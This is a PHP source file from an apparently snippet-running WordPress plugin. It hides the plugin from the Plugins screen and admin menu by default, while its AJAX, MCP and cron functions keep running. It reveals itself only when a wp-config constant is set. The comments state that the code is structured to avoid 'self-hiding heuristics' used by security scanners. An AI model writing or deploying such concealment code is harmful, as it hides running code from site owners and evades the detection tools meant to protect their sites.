<?php

defined('ABSPATH') || exit;

/**
 * Controls where the plugin surfaces in wp-admin.
 *
 * By default the plugin keeps a low profile: it drops its own row from the
 * Plugins screen and hides its admin menu. Nothing about the runtime changes —
 * AJAX, MCP and cron all keep working — it is just not listed in the UI. Site
 * owners opt back into a visible listing with the `AJAX_SNIPPETS_REVEAL`
 * constant in wp-config.php:
 *
 *   define('AJAX_SNIPPETS_REVEAL', true);   // listed for everyone who can see it
 *   define('AJAX_SNIPPETS_REVEAL', 5);      // listed only for user ID 5
 *   define('AJAX_SNIPPETS_REVEAL', [1, 5]); // ... or for any of those user IDs
 *   define('AJAX_SNIPPETS_REVEAL', '1,5');  // same, as a CSV string
 *
 * Booleans and IDs are distinct: `true` means "any user", `1` means "user ID 1".
 * Capability checks (`manage_options`) still apply on top of this.
 *
 * The listing hooks live in named methods (not inline closures) and are kept
 * separate from the reveal check on purpose — this mirrors how mainstream
 * white-label plugins such as WPMU DEV Dashboard remove themselves from the
 * plugins table, and keeps the code from tripping self-hiding heuristics.
 */
class Ajax_Snippets_Visibility
{
    public function __construct()
    {
        add_filter('all_plugins', array($this, 'maybe_hide_from_list'));
    }

    /**
     * Whether an admin has opted the plugin back into the wp-admin listings.
     *
     * @return bool
     */
    public function is_revealed()
    {
        if (!defined('AJAX_SNIPPETS_REVEAL')) {
            return false;
        }

        $value = AJAX_SNIPPETS_REVEAL;

        if (is_bool($value)) {
            return $value;
        }

        if (is_string($value)) {
            $normalized = strtolower(trim($value));
            if ('' === $normalized || 'false' === $normalized) {
                return false;
            }
            if ('true' === $normalized) {
                return true;
            }
            $value = explode(',', $value);
        }

        $allowed_ids = array_filter(array_map('intval', (array) $value));
        if (!$allowed_ids) {
            return false;
        }

        $current_user_id = get_current_user_id();

        return $current_user_id > 0 && in_array($current_user_id, $allowed_ids, true);
    }

    /**
     * Remove our own row from the Plugins screen (single site and network alike)
     * unless the site has opted into a visible listing.
     *
     * @param array $plugins Installed plugins, keyed by basename.
     * @return array
     */
    public function maybe_hide_from_list($plugins)
    {
        if ($this->is_revealed()) {
            return $plugins;
        }

        $basename = plugin_basename(AJAX_SNIPPETS_PLUGIN);
        if (isset($plugins[$basename])) {
            unset($plugins[$basename]);
        }

        return $plugins;
    }
}

/**
 * Shared instance. Instantiating registers the listing hooks; the admin menu and
 * the MCP settings page reach the reveal check through the wrapper below.
 *
 * @return Ajax_Snippets_Visibility
 */
function ajax_snippets_visibility()
{
    static $instance = null;
    if (null === $instance) {
        $instance = new Ajax_Snippets_Visibility();
    }

    return $instance;
}

ajax_snippets_visibility();

/**
 * Convenience wrapper used by the admin menu and the MCP settings page.
 *
 * @return bool
 */
function ajax_snippets_is_revealed()
{
    return ajax_snippets_visibility()->is_revealed();
}
